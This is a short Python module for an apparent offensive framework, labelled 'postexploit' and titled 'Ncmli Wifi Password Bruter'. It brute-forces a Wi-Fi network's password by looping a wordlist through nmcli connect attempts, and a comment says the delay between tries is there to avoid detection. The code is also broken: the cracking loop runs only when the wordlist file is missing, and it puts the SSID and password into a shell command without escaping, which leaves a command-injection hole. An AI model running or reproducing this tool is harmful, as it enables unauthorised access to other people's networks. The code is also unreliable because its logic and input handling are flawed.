MODULE_TYPE = "postexploit"
import zipfile
import optparse,time,os
from threading import Thread
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Ncmli Wifi Password Bruter ',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Bruteforces wifi passwords given a wordlistFile',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('SSID', ('', True, 'Wi-Fi SSID')),
                ('WORDLIST', ('/usr/share/wordlists/rockyou.txt', True, 'Wordlist path'))
                ])
                }
    def help(self):
        print("Usage: set SSID <Wi-Fi SSID> | set WORDLIST <path/to/file> then run")    	    
    def try_connect(self,ssid, password):
    	print(f"Trying password: {password}")
    	command = f"nmcli dev wifi connect '{ssid}' password '{password}'"
    	result = os.popen(command).read()
    	if "successfully activated" in result:
    	   print(f"\n[+] Password found: {password}")
    	   return True
    	return False
    
    def execute(self):
        ssid = self.info['Options']['SSID'][0]
        wordlist = self.info['Options']['WORDLIST'][0]
        if not os.path.exists(wordlist):
        	print("[-] Wordlist file not found.")
        	with open(wordlist, "r", encoding="latin-1") as file:
        	   for password in file:
        	   	password = password.strip()
        	   	if self.try_connect(ssid, password):
        	   		#pass
        	   		break
        	   	time.sleep(1)  # Add a delay to avoid detection
        
        return "[+] cracking wifi password ..."
    